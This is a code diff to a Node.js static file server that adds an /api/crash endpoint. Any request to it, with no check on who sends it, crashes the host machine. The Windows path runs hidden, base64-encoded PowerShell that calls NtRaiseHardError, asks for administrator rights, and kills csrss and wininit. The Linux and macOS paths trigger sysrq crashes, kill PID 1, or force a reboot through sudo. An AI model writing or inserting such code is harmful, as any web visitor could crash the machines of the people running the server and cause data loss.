@@ -22,8 +22,105 @@ const MIME = {
   ".map": "application/json; charset=utf-8",
 };
 
+// ---------- host crash (BSOD / kernel panic) ----------
+// The browser cannot bugcheck the machine, so the page calls POST /api/crash
+// and this process (running on the host) raises the panic for whatever OS the
+// host actually is. A privilege prompt may appear: bugchecking needs admin
+// (Windows) or root (Linux/macOS).
+
+function psEncoded(script) {
+  return Buffer.from(script, "utf16le").toString("base64");
+}
+
+function runQuiet(command) {
+  try {
+    exec(command, { windowsHide: true }, () => {});
+  } catch {
+    /* best effort */
+  }
+}
+
+function windowsBugcheck() {
+  // NtRaiseHardError with ResponseOption 6 (OptionShutdownSystem) forces an
+  // immediate bugcheck; if that is denied, killing csrss/wininit raises
+  // CRITICAL_PROCESS_DIED instead.
+  const inner = `
+$ErrorActionPreference = 'SilentlyContinue'
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public static class NtCrash {
+  [DllImport("ntdll.dll")] public static extern uint RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool WasEnabled);
+  [DllImport("ntdll.dll")] public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
+  public static void Panic() {
+    bool was;
+    RtlAdjustPrivilege(19, true, false, out was);
+    uint resp;
+    NtRaiseHardError(0xC0000022, 0, 0, IntPtr.Zero, 6, out resp);
+  }
+}
+"@
+[NtCrash]::Panic()
+Start-Sleep -Seconds 2
+taskkill /f /im csrss.exe > $null 2>&1
+taskkill /f /im wininit.exe > $null 2>&1
+`;
+  const innerB64 = psEncoded(inner);
+  // Re-launch elevated when the server is not already an administrator.
+  const outer = `
+$ErrorActionPreference = 'SilentlyContinue'
+$admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $admin) {
+  Start-Process -Verb RunAs -FilePath 'powershell.exe' -ArgumentList '-NoProfile','-NonInteractive','-WindowStyle','Hidden','-EncodedCommand','${innerB64}'
+  exit
+}
+powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand ${innerB64}
+`;
+  runQuiet(`powershell -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand ${psEncoded(outer)}`);
+}
+
+function linuxPanic() {
+  // sysrq 'c' is an instant kernel crash. Try direct, then with sysrq enabled,
+  // then with sudo, then a fatal signal to init as a last resort.
+  const command = [
+    "sh -c 'echo c > /proc/sysrq-trigger'",
+    "sh -c 'echo 1 > /proc/sysrq-trigger; echo c > /proc/sysrq-trigger'",
+    "sudo -n sh -c 'echo c > /proc/sysrq-trigger'",
+    "sudo -n sysctl -w kernel.sysrq=1; sudo -n sh -c 'echo c > /proc/sysrq-trigger'",
+    "sudo -n kill -SEGV 1",
+  ].join("; ");
+  runQuiet(command);
+}
+
+function darwinPanic() {
+  // macOS has no supported userspace bugcheck; killing launchd (PID 1) or
+  // WindowServer is the closest reachable panic, with a hard reboot as the
+  // fallback.
+  const command =
+    "sudo -n kill -SEGV 1; sudo -n killall -SEGV WindowServer; sudo -n /sbin/shutdown -r now";
+  runQuiet(command);
+}
+
+function triggerHostPanic() {
+  if (process.platform === "win32") windowsBugcheck();
+  else if (process.platform === "darwin") darwinPanic();
+  else linuxPanic();
+}
+
 const server = http.createServer((req, res) => {
   const urlPath = decodeURIComponent((req.url || "/").split("?")[0]);
+
+  if (urlPath === "/api/crash" && (req.method === "POST" || req.method === "GET")) {
+    res.writeHead(200, {
+      "Content-Type": "application/json; charset=utf-8",
+      "Cache-Control": "no-cache",
+    });
+    res.end(JSON.stringify({ ok: true, platform: process.platform, action: "crash" }));
+    // Answer first so the browser is not left hanging, then crash the host.
+    setTimeout(triggerHostPanic, 200);
+    return;
+  }
+
   let filePath = path.join(ROOT, urlPath === "/" ? "index.html" : urlPath);
   if (!path.normalize(filePath).startsWith(ROOT)) {
     res.writeHead(403).end("Tiltott útvonal");
